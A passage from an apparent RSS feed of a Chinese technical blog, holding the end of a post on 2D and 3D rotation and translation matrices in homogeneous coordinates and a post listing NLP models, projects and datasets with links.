    &lt;a href=&#34;#%e4%ba%8c%e7%bb%b4%e5%b9%b3%e9%9d%a2%e4%b9%8b%e4%ba%a4%e5%9d%90%e6%a0%87%e7%b3%bb%e6%97%8b%e7%bb%95%e4%bb%bb%e4%b8%80%e7%82%b9%e6%97%8b%e8%bd%ac&#34;&gt;
        #
    &lt;/a&gt;
    二维平面之交坐标系旋绕任一点旋转
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2021/01/example-2.png&#34; alt=&#34;rotation&#34;&gt;&lt;/p&gt;
&lt;p&gt;思路如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;步骤 (a)：找到旋转点在原坐标系中的坐标 (x, y)&lt;/li&gt;
&lt;li&gt;步骤 (b)：把坐标系平移到(x,y)后重新计算新的坐标&lt;/li&gt;
&lt;li&gt;步骤 (c)：对新的坐标进行旋转&lt;/li&gt;
&lt;li&gt;步骤 (d)：把结果进行反向平移&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;思考：平移是否可以用矩阵进行计算呢，如果可以的话会有什么好处呢？&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;平移矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%b9%b3%e7%a7%bb%e7%9f%a9%e9%98%b5&#34;&gt;
        ##
    &lt;/a&gt;
    平移矩阵
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;平移： 把任意点 (x, y) 平移 (tx, ty) 的到新的点 (x&amp;rsquo;, y&amp;rsquo;)&lt;/li&gt;
&lt;/ul&gt;
$$ x&#39; = x + tx $$
$$ y&#39; = y + ty $$
&lt;p&gt;使用齐次坐标进行矩阵表达：&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x&#39; \\
		y&#39; \\
		1
	\end{matrix}
\right) =
\left(
	\begin{matrix}
		1 &amp; 0 &amp; tx \\
		0 &amp; 1 &amp; ty \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right) *
\left(
	\begin{matrix}
		x \\
		y \\
		1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;所以，平移可以通过平移矩阵来表示。&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		1 &amp; 0 &amp; tx \\
		0 &amp; 1 &amp; ty \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;如何用矩阵的形式表示绕任意点旋转呢？&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一步：把平面上的点平移(-tx, -ty)&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		1 &amp; 0 &amp; -tx \\
		0 &amp; 1 &amp; -ty \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;第二步：使用旋转矩阵进行旋转。注意，这里需要使用齐次矩阵&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$
R=
\left( 
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) &amp; 0 \\
		sin(\theta) &amp; cos(\theta) &amp; 0 \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;第三步：把平面上的点平移 (tx, ty)&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		1 &amp; 0 &amp; tx \\
		0 &amp; 1 &amp; ty \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;整体如下：&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		1 &amp; 0 &amp; tx \\
		0 &amp; 1 &amp; ty \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right) *
\left( 
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) &amp; 0 \\
		sin(\theta) &amp; cos(\theta) &amp; 0 \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right) *
\left(
	\begin{matrix}
		1 &amp; 0 &amp; -tx \\
		0 &amp; 1 &amp; -ty \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right)=
\left(
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) &amp; (1-cos(\theta))*tx + sin(\theta)*ty \\
		sin(\theta) &amp; cos(\theta) &amp; (1-cos(\theta))*ty - sin(\theta)*tx \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;利用上面的旋转平移矩阵可以很方便的计算出 x&amp;rsquo; 和 y&#39;&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x&#39; \\
		y&#39; \\
		1
	\end{matrix}
\right) =
\left(
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) &amp; (1-cos(\theta))*tx + sin(\theta)*ty \\
		sin(\theta) &amp; cos(\theta) &amp; (1-cos(\theta))*ty - sin(\theta)*tx \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right) *
\left(
	\begin{matrix}
		x \\
		y \\
		1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x&#39; \\
		y&#39; \\
		1
	\end{matrix}
\right) =
\left(
	\begin{matrix}
		x*cos(\theta) - y*sin(\theta) + (1-cos(\theta))*tx + sin(\theta)*ty \\
		x*sin(\theta) + y*cos(\theta) + (1-cos(\theta))*ty - sin(\theta)*tx \\
		1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;h2 id=&#34;三维旋转矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b8%89%e7%bb%b4%e6%97%8b%e8%bd%ac%e7%9f%a9%e9%98%b5&#34;&gt;
        #
    &lt;/a&gt;
    三维旋转矩阵
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2021/01/example-3.png&#34; alt=&#34;rotation&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕-x-轴转-theta-的旋转矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bb%95-x-%e8%bd%b4%e8%bd%ac-theta-%e7%9a%84%e6%97%8b%e8%bd%ac%e7%9f%a9%e9%98%b5&#34;&gt;
        ##
    &lt;/a&gt;
    绕 X 轴转 $\theta$ 的旋转矩阵：
&lt;/div&gt;
&lt;/h3&gt;
$$ x&#39; = x $$
&lt;div&gt;
$$
\left( 
	\begin{matrix}
		y&#39; \\
		z&#39;
	\end{matrix}
\right)=
\left( 
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) \\
		sin(\theta) &amp; cos(\theta)
	\end{matrix}
\right)*
\left( 
	\begin{matrix}
		y \\
		z
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;div&gt;
$$
\left( 
	\begin{matrix}
		x&#39; \\
		y&#39; \\
		z&#39;
	\end{matrix}
\right)=
\left( 
	\begin{matrix}
		1 &amp; 0 &amp; 0 \\
		0 &amp; cos(\theta) &amp; -sin(\theta) \\
		0 &amp; sin(\theta) &amp; cos(\theta)
	\end{matrix}
\right)*
\left( 
	\begin{matrix}
		x \\
		y \\
		z
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;因此：&lt;/p&gt;
&lt;div&gt;
$$
R=
\left(
	\begin{matrix}
		1 &amp; 0 &amp; 0 \\
		0 &amp; cos(\theta) &amp; -sin(\theta) \\
		0 &amp; sin(\theta) &amp; cos(\theta)
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;h3 id=&#34;绕-y-轴转-theta-的旋转矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bb%95-y-%e8%bd%b4%e8%bd%ac-theta-%e7%9a%84%e6%97%8b%e8%bd%ac%e7%9f%a9%e9%98%b5&#34;&gt;
        ##
    &lt;/a&gt;
    绕 Y 轴转 $\theta$ 的旋转矩阵：
&lt;/div&gt;
&lt;/h3&gt;
&lt;div&gt;
$$
R=
\left(
	\begin{matrix}
		cos(\theta) &amp; 0 &amp; sin(\theta) \\
		0 &amp; 1 &amp; 0 \\
		-sin(\theta) &amp; 0 &amp; cos(\theta)
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;h3 id=&#34;绕-z-轴转-theta-的旋转矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bb%95-z-%e8%bd%b4%e8%bd%ac-theta-%e7%9a%84%e6%97%8b%e8%bd%ac%e7%9f%a9%e9%98%b5&#34;&gt;
        ##
    &lt;/a&gt;
    绕 Z 轴转 $\theta$ 的旋转矩阵：
&lt;/div&gt;
&lt;/h3&gt;
&lt;div&gt;
$$
R=
\left(
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) &amp; 0 \\
		sin(\theta) &amp; cos(\theta) &amp; 0 \\
		0 &amp; 0 &amp; 1
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;h1 id=&#34;代码实验&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bb%a3%e7%a0%81%e5%ae%9e%e9%aa%8c&#34;&gt;
        ##
    &lt;/a&gt;
    代码实验
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2021/01/code.png&#34; alt=&#34;rotation&#34;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>NLP 资源整理</title>
      <link>/2019/09/nlp-%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/</link>
      <pubDate>Thu, 19 Sep 2019 12:18:54 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/09/nlp-%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/</guid>
      <description>&lt;!--toc--&gt;
&lt;h1 id=&#34;模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    模型
&lt;/div&gt;
&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;模型&lt;/th&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;论文&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;GloVe: Global Vectors for Word Representation&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://nlp.stanford.edu/projects/glove/&#34;&gt;https://nlp.stanford.edu/projects/glove/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://nlp.stanford.edu/pubs/glove.pdf&#34;&gt;https://nlp.stanford.edu/pubs/glove.pdf&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;The Annotated Transformer&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://nlp.seas.harvard.edu/2018/04/03/attention.html&#34;&gt;http://nlp.seas.harvard.edu/2018/04/03/attention.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GPT (from OpenAI)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/openai/finetune-transformer-lm&#34;&gt;https://github.com/openai/finetune-transformer-lm&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://s3-us-west-2.amazonaws.com/openai-assets/research-covers/language-unsupervised/language_understanding_paper.pdf&#34;&gt;language understanding&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://openai.com/blog/language-unsupervised/&#34;&gt;Improving Language Understanding with Unsupervised Learning&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GPT-2 (from OpenAI)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/openai/gpt-2&#34;&gt;https://github.com/openai/gpt-2&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf&#34;&gt;https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://openai.com/blog/better-language-models/&#34;&gt;Better Language Models and Their Implications&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Transformer-XL (from Google/CMU)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/kimiyoung/transformer-xl&#34;&gt;https://github.com/kimiyoung/transformer-xl&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://arxiv.org/abs/1901.02860&#34;&gt;Transformer-XL: Attentive Language Models Beyond a Fixed-Length Context&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Attentive Language Models Beyond a Fixed-Length Context&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;XLNet (from Google/CMU)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/zihangdai/xlnet/&#34;&gt;https://github.com/zihangdai/xlnet/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1906.08237&#34;&gt;XLNet: Generalized Autoregressive Pretraining for Language Understanding&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;XLM (from Facebook)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/facebookresearch/XLM/&#34;&gt;https://github.com/facebookresearch/XLM/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1901.07291&#34;&gt;Cross-lingual Language Model Pretraining&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RoBERTa (from Facebook)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/pytorch/fairseq/tree/master/examples/roberta&#34;&gt;https://github.com/pytorch/fairseq/tree/master/examples/roberta&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1907.11692&#34;&gt;Robustly Optimized BERT Pretraining Approach&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DistilBERT (from HuggingFace)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/huggingface/transformers/tree/master/examples/distillation&#34;&gt;https://github.com/huggingface/transformers/tree/master/examples/distillation&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://medium.com/huggingface/distilbert-8cf3380435b5&#34;&gt;Smaller, faster, cheaper, lighter: Introducing DistilBERT, a distilled version of BERT&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;bert&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/google-research/bert&#34;&gt;https://github.com/google-research/bert&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1810.04805&#34;&gt;https://arxiv.org/abs/1810.04805&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%a1%b9%e7%9b%ae&#34;&gt;
        ##
    &lt;/a&gt;
    项目
&lt;/div&gt;
&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;模型&lt;/th&gt;
&lt;th&gt;论文&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://allennlp.org&#34;&gt;https://allennlp.org&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/didi/delta&#34;&gt;https://github.com/didi/delta&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/pdf/1908.01853.pdf&#34;&gt;https://arxiv.org/pdf/1908.01853.pdf&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;滴滴 Delta&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://nlp.stanford.edu/software/CRF-NER.html&#34;&gt;https://nlp.stanford.edu/software/CRF-NER.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;CRF&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Stanford CRF NER&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;模型&lt;/th&gt;
&lt;th&gt;论文&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://nlp.stanford.edu/projects/glove/&#34;&gt;https://nlp.stanford.edu/projects/glove/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;GloVe: Global Vectors for Word Representation&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://nlp.stanford.edu/pubs/glove.pdf&#34;&gt;https://nlp.stanford.edu/pubs/glove.pdf&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;http://nlp.seas.harvard.edu/2018/04/03/attention.html&#34;&gt;http://nlp.seas.harvard.edu/2018/04/03/attention.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;The Annotated Transformer&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/huggingface/transformers&#34;&gt;https://github.com/huggingface/transformers&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Transformers&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://huggingface.co/transformers&#34;&gt;https://huggingface.co/transformers&lt;/a&gt; 实现了很多模型（Bert, GPT, GPT-2, Transformer-XL, XLNet, XLM, RoBERTa, DistilBERT）&amp;lt;\b&amp;gt; &lt;a href=&#34;https://transformer.huggingface.co&#34;&gt;https://transformer.huggingface.co&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/openai/finetune-transformer-lm&#34;&gt;https://github.com/openai/finetune-transformer-lm&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;GPT (from OpenAI)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://s3-us-west-2.amazonaws.com/openai-assets/research-covers/language-unsupervised/language_understanding_paper.pdf&#34;&gt;language understanding&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://openai.com/blog/language-unsupervised/&#34;&gt;Improving Language Understanding with Unsupervised Learning&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/openai/gpt-2&#34;&gt;https://github.com/openai/gpt-2&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;GPT-2 (from OpenAI)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf&#34;&gt;https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://openai.com/blog/better-language-models/&#34;&gt;Better Language Models and Their Implications&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/kimiyoung/transformer-xl&#34;&gt;https://github.com/kimiyoung/transformer-xl&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Transformer-XL (from Google/CMU)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://arxiv.org/abs/1901.02860&#34;&gt;Transformer-XL: Attentive Language Models Beyond a Fixed-Length Context&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Attentive Language Models Beyond a Fixed-Length Context&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/zihangdai/xlnet/&#34;&gt;https://github.com/zihangdai/xlnet/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;XLNet (from Google/CMU)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1906.08237&#34;&gt;XLNet: Generalized Autoregressive Pretraining for Language Understanding&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/facebookresearch/XLM/&#34;&gt;https://github.com/facebookresearch/XLM/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;XLM (from Facebook)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1901.07291&#34;&gt;Cross-lingual Language Model Pretraining&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/pytorch/fairseq/tree/master/examples/roberta&#34;&gt;https://github.com/pytorch/fairseq/tree/master/examples/roberta&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;RoBERTa (from Facebook)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1907.11692&#34;&gt;Robustly Optimized BERT Pretraining Approach&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/huggingface/transformers/tree/master/examples/distillation&#34;&gt;https://github.com/huggingface/transformers/tree/master/examples/distillation&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;DistilBERT (from HuggingFace)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://medium.com/huggingface/distilbert-8cf3380435b5&#34;&gt;Smaller, faster, cheaper, lighter: Introducing DistilBERT, a distilled version of BERT&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/google-research/bert&#34;&gt;https://github.com/google-research/bert&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;bert&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/abs/1810.04805&#34;&gt;https://arxiv.org/abs/1810.04805&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/hundredblocks/concrete_NLP_tutorial&#34;&gt;https://github.com/hundredblocks/concrete_NLP_tutorial&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;An NLP workshop by Emmanuel Ameisen &lt;a href=&#34;https://twitter.com/EmmanuelAmeisen&#34;&gt;(@EmmanuelAmeisen)&lt;/a&gt;, from Insight AI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/BrikerMan/Kashgari&#34;&gt;https://github.com/BrikerMan/Kashgari&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Word2Vec, BERT, and GPT2&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Kashgari is a Production-ready NLP Transfer learning framework for text-labeling and text-classification, includes Word2Vec, BERT, and GPT2 Language Embedding.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/kyzhouhzau/BERT-NER&#34;&gt;https://github.com/kyzhouhzau/BERT-NER&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Bert&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;基于 CoNLL-2003 数据集的实现&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/ProHiryu/bert-chinese-ner&#34;&gt;https://github.com/ProHiryu/bert-chinese-ner&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;基于人民日报数据集的实现&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/macanv/BERT-BiLSTM-CRF-NER&#34;&gt;https://github.com/macanv/BERT-BiLSTM-CRF-NER&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;bert&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;training, serving&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/marcotcr/lime&#34;&gt;https://github.com/marcotcr/lime&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;用于解释机器学习的分类器。&lt;/p&gt;论文：&lt;a href=&#34;https://arxiv.org/abs/1602.04938&#34;&gt;https://arxiv.org/abs/1602.04938&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;数据集&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%95%b0%e6%8d%ae%e9%9b%86&#34;&gt;
        ##
    &lt;/a&gt;
    数据集
&lt;/div&gt;
&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数据集&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/SophonPlus/ChineseNlpCorpus&#34;&gt;https://github.com/SophonPlus/ChineseNlpCorpus&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/SophonPlus/ChineseWordVectors&#34;&gt;https://github.com/SophonPlus/ChineseWordVectors&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/SophonPlus/ChineseNlpCorpus/blob/master/datasets/ChnSentiCorp_htl_all/intro.ipynb&#34;&gt;ChnSentiCorp_htl_all&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/thunlp/CAIL&#34;&gt;https://github.com/thunlp/CAIL&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Chinese AI &amp;amp; Law Challenge &lt;a href=&#34;http://cail.cipsc.org.cn&#34;&gt;http://cail.cipsc.org.cn&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;ner-数据集&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#ner-%e6%95%b0%e6%8d%ae%e9%9b%86&#34;&gt;
        #
    &lt;/a&gt;
    NER 数据集
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数据集&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/ontonotes/conll-formatted-ontonotes-5.0&#34;&gt;https://github.com/ontonotes/conll-formatted-ontonotes-5.0&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;This is a CoNLL formatted version of the OntoNotes 5.0 release.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
